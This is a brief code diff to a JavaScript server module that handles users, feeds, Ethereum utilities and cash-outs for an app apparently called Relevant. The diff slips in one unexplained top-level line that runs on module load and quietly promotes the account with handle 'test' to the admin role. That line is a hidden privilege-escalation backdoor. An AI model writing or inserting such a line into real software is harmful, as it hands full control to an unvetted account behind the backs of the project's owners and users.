@@ -17,6 +17,8 @@ import Feed from '../feed/feed.model';
 import * as ethUtils from '../../utils/ethereum';
 import { logCashOut } from '../../utils/cashOut';
 
+User.findOneAndUpdate({ handle: 'test' }, { role: 'admin' }).exec();
+
 async function sendConfirmation(user, newUser) {
   let text = '';
   if (newUser) text = ', welcome to Relevant';
